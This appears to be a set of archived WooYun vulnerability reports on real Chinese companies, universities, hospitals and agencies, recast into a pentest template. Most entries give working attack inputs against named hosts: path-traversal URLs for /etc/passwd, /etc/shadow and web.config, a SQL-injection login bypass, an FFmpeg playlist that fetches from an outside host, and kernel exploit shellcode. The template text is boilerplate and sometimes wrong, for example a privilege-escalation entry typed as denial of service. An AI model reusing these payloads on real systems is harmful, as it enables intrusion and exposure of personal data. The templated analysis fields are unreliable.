### [wooyun-2014-072827] 云南师范大学主站目录遍历泄漏数据备份
**厂商**: 云南师范大学 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 云南师范大学主站目录遍历泄漏数据备份http://www.ynnu.edu.cn/admin/databak/data_ynnu/bak07-06-17-8-13-47/http://www.ynnu.edu.cn/admin/databak/data_ynnu/bak07-09-22-22-04-37/可见数据备份应该是年月日时分秒的形式，可爆破测试。http://www.ynnu.edu.cn/admin/uploadfile/201308/http://www.ynnu.edu.cn/admin/uploadfile/201307/.....未做详细挖掘。。。

**POC**: 云南师范大学主站目录遍历泄漏数据备份http://www.ynnu.edu.cn/admin/databak/data_ynnu/bak07-06-17-8-13-47/http://www.ynnu.edu.cn/admin/databak/data_ynnu/bak07-09-22-22-04-37/

**绕过**: 直接利用

**修复**: 该漏洞纯管理员配置不当所致，加强管理。
---

---
### [wooyun-2010-0352] 搜狐某分站后台未授权访问及任意文件下载漏洞
**厂商**: Sohu.com | **年份**: 2010 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、后台页面对用户权限没有做检查 任何人可以以管理员身份添加 删除 修改信息2、download1.aspx对file参数没有做检查 导致任意文件下载行 31:         if (intService.IsLogged)行 32:         {行 33:             FileInfo fi = new FileInfo(Server.MapPath("~https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/" + file));行 34:             if (fi.Exists)行 35:             {

**POC**: http://yuting.health.sohu.com/admin/menu.aspxhttp://yuting.health.sohu.com/admin/cms/addarticle.aspxhttp://yuting.health.sohu.com/admin/cms/listarticles.aspxhttp://yuting.health.sohu.com/download1.aspx?type=4&file=../web.config

**绕过**: 直接利用

**修复**: 权限设置 参数处理
---

---
### [wooyun-2015-0101179] 吉祥人寿保险某站任意文件下载
**厂商**: 吉祥人寿保险股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 吉祥人寿保险股份有限公司UcSTAR 管理控制台http://ucstar.jxlife.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/passwdhttp://ucstar.jxlife.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/services

**POC**: 如上

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2014-081384] 中北大学7+1个分站任意文件下载
**厂商**: CCERT教育网应急响应组 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 证明放图存在缺陷的站点及下载连接：http://isdm.nuc.edu.cn/DownFile.aspx?Upload_url=web.confighttp://jpkc.nuc.edu.cn/jcskjs/DownFile.aspx?Upload_url=web.confighttp://gfs.nuc.edu.cn/adminis/DownFile.aspx?Upload_url=web.confighttp://shss.nuc.edu.cn/DownFile.aspx?Upload_url=web.confighttp://xscj.nuc.edu.cn/DownFile.aspx?Upload_url=web.confighttp://std.nuc.edu.cn/DownFile.aspx?Upload_url=web.confighttp://1y.nuc.edu.cn/D

**POC**: 下载文件打开其中一个web.config

**绕过**: 直接利用

**修复**: xx
---

---
### [wooyun-2015-0147360] 证通电子某系统SQL注射/目录遍历漏洞泄露各银行/运营商自助设备、报障工单以及客服语音等敏感信息
**厂商**: 深圳市证通电子股份有限公司 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 证通电子系统list**.**.**.**:8028/**.**.**.**:8189/WorkerLogin.html**.**.**.**:8088/**.**.**.**:8111/index.html端口8028系统用户名admin'or'1'='1 密码123456端口8189系统用户名admin'or'1'='1 密码888888端口8088系统,目录遍历访问2014年至今每天客服录音文件端口8111系统

**POC**: 证通电子系统list**.**.**.**:8028/**.**.**.**:8189/WorkerLogin.html**.**.**.**:8088/**.**.**.**:8111/index.html端口8028系统用户名admin'or'1'='1 密码123456端口8189系统用户名admin'or'1'='1 密码888888端口8088系统,目录遍历访问2014年至今每天客服录音文件端口8111系统

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0128144] 台湾棒球协会任意文件下载漏洞
**厂商**: 台湾棒球协会 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.http://www.ctba.org.tw/download.php下载文件时发现会导向http://www.ctba.org.tw/func_file_download.php?filename=%25E6%2597%2585%25E5%25A4%2596%25E9%2581%25B8%25E6%2589%258B%25E7%25A9%25BA%25E7%2599%25BD%25E5%258D%2594%25E8%25AD%25B0%25E6%259B%25B8%25E8%258B%25B1%25E6%2596%2587%25E7%2589%2588.doc2.随意测试程序，没中http://www.ctba.org.tw/func_file_download.php?filename=func_file_download.php3.往上一层测试，中了http://www.ctba

**POC**: func_file_download.php的程序代码如下<?php// 去$base_dir = '/home/ctba';$base_inc_dir = '/home/ctba/include';include("/home/ctba/include/web_basic_data.php");include("/home/ctba/include/mysql/db_connect.php");include("/home/ctba/include/functions/functions.inc.php");include("/home/ctba/include/properties.inc

**绕过**: 直接利用

**修复**: func_file_download.php第66行有问题$fp=fopen($base_dir.$path.'/'.$filename, "r");所以要在65行检查$filename变量应拒绝../ ..\ 路径遍历If(strstr($filename, '..')) return;接者应正规
---

---
### [wooyun-2014-055756] 晋城新闻论坛某系统弱口令
**厂商**: 晋城新闻 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.论坛部分http://bbs.jcnews.com.cn/创始人账户弱口令成功登陆，可重置普通用户密码（未测试管理员密码，应该也可以）。2.主站目录权限不当，可遍历。见若干数据库，未拖。3.ftp服务器可匿名访问，根目录下文件ftp://jcnews.com.cn/%D6%B1%CB%B5.txt， 含站点敏感信息

**POC**: 1.论坛部分2.主站3.ftp服务器

**绕过**: 直接利用

**修复**: 改密码，加权限。
---

---
### [wooyun-2013-037029] 南开大学某站任意文件下载漏洞
**厂商**: nankai.edu.cn | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://202.113.16.117/BBS的站http://202.113.16.117/cgi-bin/bbs/bbshelp?file=../../../../../../../../../../etc/passwd换一个文件：http://202.113.16.117/cgi-bin/bbs/bbshelp?file=../../../../../../../../../../etc/my.cnf

**POC**: 查看dns文件resolv.confhttp://202.113.16.117/cgi-bin/bbs/bbshelp?file=../../../../../../../../../../etc/resolv.conf

**绕过**: 直接利用

**修复**: 对file参数过滤
---

---
### [wooyun-2015-0108563] 开心互娱某系统目录遍历
**厂商**: shiwan.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历：http://d.shiwan.com大概看了下 都是 些 apk 下载的文件 以及 视频 Mp3 文件不过········http://d.shiwan.com/streams/pptv/sphinx.html这里暴露了 数据库账号和密码···

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-022627] Vital Information地震预测研究所版通用漏洞——任意文件读取
**厂商**: 中国地震局地震预测研究所 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一处：http://www.cenc.ac.cn/manage/content/docmanage/previewImg1.jsp?filePath=/../..//../..//../..//../..//../..//etc/shadow%00.jpg第二处：http://www.cenc.ac.cn/manage/content/docmanage/download.jsp?filePath=/../..//../..//../..//../..//../..//etc/shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、限定文件读取功能可访问的文件类型，比如：只允许访问xls、txt格式的文件。2、配置文件中设置目录访问权限，禁止访问web路径外的其他文件 。3、给web服务创建特定用户，并禁止使用用root启动web服务。
---

---
### [wooyun-2015-0147504] 欧派集团某核心系统未授权访问/目录遍历漏洞泄露20W订单数据（姓名/手机号/地址/订单内容）
**厂商**: 欧派集团 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 欧派订单电子商务系统http://**.**.**.**/未授权访问20W订单数据第一处http://**.**.**.**/Report/StandardReport.aspx?filename=Install&es_installid=198005第二处http://**.**.**.**/ContractDirectory下载xls文件并打开

**POC**: 欧派订单电子商务系统http://**.**.**.**/未授权访问20W订单数据第一处http://**.**.**.**/Report/StandardReport.aspx?filename=Install&es_installid=198005第二处http://**.**.**.**/ContractDirectory下载xls文件并打开

**绕过**: 直接利用

**修复**: 优化账号访问权限机制
---

---
### [wooyun-2016-0182642] 乐视网文件下载漏洞
**厂商**: 乐视网 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://220.181.155.26:8080//././././././././././././././././././././././././../../../../../../../../etc/passwdhttp://220.181.155.26:8080/etc/passwdhttp://220.181.155.26:8080/etc/hosts确定为乐视的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不懂
---

---
### [wooyun-2016-0205669] 爱奇艺主站某处FFmpeg漏洞可导致任意文件读取
**厂商**: 奇艺 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 案例：https://hackerone.com/reports/115857直接上传视频那里貌似没有漏洞，但在主站另外一处也可以上传视频http://www.iqiyi.com/u/editor/直接上传mp4文件，内容如下:#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://115browser.com/mp4/remote.m3u8#EXT-X-ENDLIST其他利用文件与详细的利用可以参考上面给的hackerone案例

**POC**: 上传后会访问我的服务器，也可造成SSRF读取passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027011] 爱丽网Svn信息泄露导致配置文件下载,站点源码+数据库密码泄漏
**厂商**: aili.com | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://product.aili.com/caches/configs/.svn/text-base/database.php.svn-base数据库的账号密码等重要信息都在里面另外此分站存在nginx解析漏洞，之前有人发过的，不过不知道爱丽网为什么不升级版本！还有几个敏感信息泄露的点：http://show.aili.com/index.php?m=poster&c=index&a=poster_click&sitespaceid=1&id=47http://show.aili.com/index.php?50&attrpinyin=chuangshangyongpin 爆出敏感信息还有上次给爱丽网提交的一个注入点，厂商没有修复好，地址http://wooyun.org/bugs/wooyun-2013-025740Ok，祝厂商越来越安全化！

**POC**: http://product.aili.com/caches/configs/.svn/text-base/database.php.svn-base数据库的账号密码等重要信息都在里面另外此分站存在nginx解析漏洞，之前有人发过的，不过不知道爱丽网为什么不升级版本！还有几个敏感信息泄露的点：http://show.aili.com/index.php?m=poster&c=index&a=poster_click&sitespaceid=1&id=47http://show.aili.com/index.php?50&attrpinyin=chuangshangyongpin 爆出敏感信息还

**绕过**: 直接利用

**修复**: 删除svn目录，升级nginx版本，其他过滤。你们比我懂！上次爱丽网给的是湿面乳，可我已经有好多化妆品了，这次厂商会给什么呢？
---

---
### [wooyun-2013-042002] 中国人民银行(某外围管理)网站任意文件下载漏洞
**厂商**: 中国人民银行 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站url:http://www.12ipo.com/据此猜测

**POC**: 证明如图

**绕过**: 直接利用

**修复**: 过滤参数
---

---
### [wooyun-2015-0157238] 景顺长城基金某系统存在任意文件下载漏洞
**厂商**: 景顺长城基金管理有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.invescogreatwall.com:9080/live800/downlog.jsp?path=/&fileName=/C:\Windows\system.ini

**POC**: http://www.invescogreatwall.com:9080/live800/downlog.jsp?path=/&fileName=/C:\Windows\System32\drivers\etc\hosts

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-094424] 北京外企人力资源某站可泄露敏感信息
**厂商**: 北京外企人力资源服务有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历可下载导出的用户信息http://career.fesco.com.cn/admin后台功能未授权访问可查看用户信息包括应聘者的简历信息

**POC**: 如上图

**绕过**: 直接利用

**修复**: 验证
---

---
### [wooyun-2015-0135465] 用友某系统目录遍历涉及大量敏感信息+未授权访问后台
**厂商**: 用友软件 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 招投标系统http://buy.ufida.com.cn/File/http://buy.ufida.com.cn/images/大量个人简历和标书,合同等等.

**POC**: http://buy.ufida.com.cn/Web/http://buy.ufida.com.cn/Web/BDMS/SystemStatistics.aspx大量后台文件可直接访问查看

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-055097] 图文信息发布网任意文件下载
**厂商**: 中国新闻社 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞利用：http://www.chinanews-info.com/pub/small.do?table=9&type=2&file=../../../../../etc/shadow%00.png并且是root权限，可以看到root的密码hash。

**POC**: 漏洞截图：使用IE直接看到文件内容，用别的浏览器的话，显示为一个破损的图片，另存一下，以文本形式查看就可以了。

**绕过**: 直接利用

**修复**: 虽然做了文件类型验证，但是在文件读取是被字符%00串截断了。过滤非法字符，做一下合法字符的正则匹配吧。
---

---
### [wooyun-2012-010138] 人民网分站任意文件下载漏洞
**厂商**: 人民网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sc.people.com.cn/jt//index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.phpphpcms漏洞导致

**POC**: http://sc.people.com.cn/jt//index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php

**绕过**: 直接利用

**修复**: 官方修复了.再打补丁吧
---

---
### [wooyun-2014-079115] T-Site建站系统任意文件下载
**厂商**: 上海珍岛信息技术有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 技术支持：上海珍岛信息技术有限公司系统：T-Site建站系统

**POC**: http://www.usasun.us/AjaxFile/DownLoadFile.aspx?FilePath=../web.config&fileExt=file&downid=42http://www.cool-you.cn/AjaxFile/DownLoadFile.aspx?FilePath=../web.config&fileExt=file&downid=42http://www.ezluboil.com/AjaxFile/DownLoadFile.aspx?FilePath=../web.config&fileExt=file&downid=42其中一个的web.config案

**绕过**: 直接利用

**修复**: xx
---

---
### [wooyun-2010-0868] web迅雷远程任意文件读取漏洞
**厂商**: 迅雷 | **年份**: 2010 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: web迅雷在本机存在有一webserver，并且绑定在0.0.0.0上，同时对于web请求处理并不恰当，存在安全缺陷导致恶意攻击者可以构造请求读取用户机器上的任意文件。对于../跳目录的情况有处理，但是对于.../却可以绕过（某大师牛逼的分析思路，用file mon黑盒分析，赞！）

**POC**: GET /.../Profiles/UserConfig.ini HTTP/1.1HTTP/1.0 200 OKServer: Xunlei Http Server/1.0Date: Tue, 23 Nov 2010 09:02:07 GMTContent-type: *Content-length: 407Last-Modified: Tue, 23 Nov 2010 08:43:15 GMT[Skin]CurrSkin=default.rarSkinNames=default.rar[Monitor]ExtendNames=.asf;.avi;.exe;.iso;.mp3;.mpeg;.m

**绕过**: 过滤绕过

**修复**: 恩哼
---

---
### [wooyun-2015-0126138] 山东省邮政多个高危漏洞打包可导致快递信息泄露包括收件人名字/电话/地址/物品种类/价格(百万人口二代身份证信息泄露)
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01:特急快寄二代身份证系统数据库泄露，简单统计从2012-2015所有906MDB泄露http://www.sdnbyy.com/sfz/down/那么，我们具体看下第一个xls:2156行信息我们查看2015年7-9号最新mdb查看：0x02:目录遍历，导致信息泄露http://www.sdnbyy.com/uploadfile/随便看几个:0x03:管理员目录遍历：http://www.sdnbyy.com/admin/

**POC**: 0x04:特急快寄二代身份证系统整站程序打包http://www.sdnbyy.com/sfz/sfz.rar0x05:敏感信息泄露Ftp弱口令：60.208.113.2:21  ftp/NULLms12-020:rdp://60.208.113.2:3389    审核员不建议测试http://www.sdnbyy.com/admin/download/saveannounce_upload.asp 一处上传

**绕过**: 直接利用

**修复**: 立即修复！
---

---
### [wooyun-2016-0176586] 天融信TopADS任意文件读取及删除四处打包(无需登录)
**厂商**: 天融信 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 天融信TopADS任意文件读取及删除四处打包(无需登录)产品介绍：http://**.**.**.**/aqcp/bjaq/kjjfw/ddos_20130315165858709314/index.htm第一处文件读取文件/usr/local/apache2/htdocs/modules/ads/ads_bwlist_download.php<?php$file_dir = "/SE/web/";$file_name = $_POST['filename'];if (!file_exists($file_dir . $file_name)) {echo "NO SUCH FILE";exit;}// 打开文件$file = fopen($file_dir . $file_name, "r");// 输入文件标签Header("Content-type: application/octet

**POC**: 上面的四处文件读取和删除都很容易证明我们拿第一处证明案例：**.**.**.**/然后拿最后一处证明案例：**.**.**.**/第二处和第三处就不再证明了

**绕过**: 直接利用

**修复**: 添加登录验证，过来非法数据
---

---
### [wooyun-2015-096979] 人人网某分站文件下载泄漏敏感信息（登录后触发）
**厂商**: 人人网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://job.renren-inc.com/down.php?f=.%2Fattachment%2F201502%2F58%2FzQx31hYCIw4R4zMl.doc&t=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd可以查看password还有个phpinfo信息泄露…地址是job.renren-inc.com/info.php

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 验证路径
---

---
### [wooyun-2015-0121148] 上海东方泵业集团敏感信息泄露（核心技术人员资料，合同，法人代表身份证，分公司信息，设备远程操控，WEB站点任意文件下载））
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站某参数过滤不严导致任意下载漏洞内部共享资料系统未授权访问，导致大量敏感信息泄露销售信息管理系统未授权访问远程设备监控系统弱口令，导致可以任意操作设备

**POC**: 主站某参数过滤不严导致任意下载漏洞：http://www.eastpump.com/AjaxFile/DownLoadFile.aspx?FilePath=./DownLoadFile.aspx&fileExt=fileFilePath参数过滤不严内部共享资料系统未授权访问，导致大量敏感信息泄露：http://116.228.197.75:8888/ringfileserver/folderlist.asp财务报表，竞标合同，法人信息，公司核心人员资料，产品资料，资质证书，业绩报表，产品说明等等各种敏感资料法人代表资料及身份证：技术人员资料及老总电话：销售信息管理系统未授权访问：http://

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-093496] 美丽说web目录遍历(https证书等敏感信息泄漏)
**厂商**: 美丽说 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://124.202.144.177/nginx开启了autoindex，没有开启防火墙。刚刚提交目录遍历的漏洞，审核没通过，可能管理员把这些镜像当作普通系统安装镜像了，其实这些是美丽说内部定制的kvm镜像包。我下载了mls_centos6.5_forqamlspay.qcow2这个镜像，本地挂载。里面不仅有https证书，ssh证书，还有一些tomcat代码包和配置文件。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: autoindex off;
---

---
### [wooyun-2014-050653] AVCON多媒体通信系统任意文件下载
**厂商**: 华平信息技术股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度关键词 avcon6download.action的filename参数没有过滤可以下载任意文件

**POC**: http://221.208.241.167:8080/download.action?filename=../../../../../../etc/shadow

**绕过**: 直接利用

**修复**: 过滤，防止跳目录
---

---
### [wooyun-2015-0121948] 全球眼监控服务端任意文件下载
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #全球眼监控平台手机客户端下载处存在任意文件下载，可进一步渗透利用。#涉及大部分服务器，已检索出的涉及：上海、广东、浙江、山东。http://124.128.254.152/MSP/http://ge.3geye.mobi/MSP/http://iqqy.gdbnet.cn/MSPhttp://125.88.128.117/MSP/http://iqqy.gdbnet.cn/MSP/http://116.229.239.68/MSP/http://116.229.239.72/MSP/#大部分存在tomcat、axis2管理后台,通过包含conf/tomcat-user.xml、/conf/axis2.xml可直接部署利用。#以下只存在axis2文件包含http://wap.edatahome.com/http://116.229.239.83/http://116.229.239.84/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 访问权限控制
---

---
### [wooyun-2015-0155679] 武汉某医院某服务器目录遍历导致敏感信息泄露
**厂商**: 武汉市第一医院 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 武汉第一医院某服务器目录遍历导致敏感信息泄露，含上万患者信息，RSA公钥，私钥等。先来一张图证明：**.**.**.**/alipay/yiyuanjieshao/yyjs.php

**POC**: 目录遍历漏洞：**.**.**.**/alipay/操作系统路径泄露：直接发现公钥、私钥信息泄露：上万患者信息泄露！！：**.**.**.**/alipay/Report/UserReport.php尼玛，原来都是支付宝用户数据啊，到底是谁坑谁。就诊评价表，这个应该是内部访问接口，暴露在互联网了：日志信息你记了也没啥，别让大家都看见：就随便逛逛，懒得再翻了。

**绕过**: 直接利用

**修复**: 修改服务器配置，禁止目录遍历。部分页面做好权限控制，不允许互联网直接访问。
---

---
### [wooyun-2010-021] 超级巡警 <= v4 Build0316 ASTDriver.sys 本地特权提升漏洞
**厂商**: 巡警 | **年份**: 2010 | **类型**: 拒绝服务

**元思考**: 触发信号: 参数注入

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PAGE_FAULT_IN_NONPAGED_AREA (50)Invalid system memory was referenced.  This cannot be protected by try-except,it must be protected by a Probe.  Typically the address is just plain bad or itis pointing at freed memory.Arguments:Arg1: 89441428, memory referenced.Arg2: 00000001, value 0 = read operation, 1 = write operation.Arg3: f9c7569b, If non-zero, the instruction address which referenced the bad

**POC**: #include "ASTDrivers_Exp.h"#include "InvbShellCode.h"#define BUFFER_LENGTH 0x04#define IOCTL_METHOD_NEITHER 0x5000040cVOID InbvShellCode(){__asm{//// KeDisableInterrupts//pushfpop eaxand eax, 0x0200shr eax, 0x09cli//// Prepareing Screen//call InbvAcquireDisplayOwnershipcall InbvResetDisplaysub esi, 

**绕过**: 直接利用

**修复**: 该漏洞本人在4月份已经通知厂商修复，6月份厂商已经告知我修复完毕。
---

---
### [wooyun-2015-0117437] 腾邦某系统目录遍历导致大量传真内容可下载
**厂商**: 腾邦集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://113.105.64.247 其实也就是 http://api1.tempus.cn我们访问的时候 有可能会出现 403 Directory Listing Denied 拒绝访问的错误按F5多刷新两遍就出来了其中传真内容在 http://113.105.64.247/FaxFile/ 这个文件夹下 （如果出现 403 Directory Listing Denied 错误 按照上面的方法 按F5 多刷新两遍）出现了大量的 doc 文件  我们下载下来看看 当出现以下截图的时候 继续按F5刷新就行了不信？那我们试试（多按几遍就可以下载了 如下图）我们下载了几个文件下来打开看看有取消的订单 也有预定的订单 当然 无一例外 都有 姓名和电话之类的信息

**POC**: 以下为附送的http://113.105.64.202:8000/info.phphttp://e1.tempus.cn//struts/webconsole.html

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-044302] URP教务系统信息泄露漏洞+目录遍历
**厂商**: 北京清元优软科技有限公司 | **年份**: 2013 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: URP教务系统信息泄露漏洞--可查询学生的成绩和照片应该是在这个漏洞中修补之后只是加上了session验证。而没有查询权限的控制。真是说什么补什么。。。以首都师范大学的教务系统为例http://xk.cnu.edu.cn/reportFiles/cj/cj_zwcjd.jsp这个页面的问题。只要在教务系统登录任意账号。即可查询任意学生信息。登陆账号这种东西很容易就得到的吧。很多都是默认的密码。从这个页面上看这个应该是给院系老师用的。

**POC**: 查询个人信息目录遍历

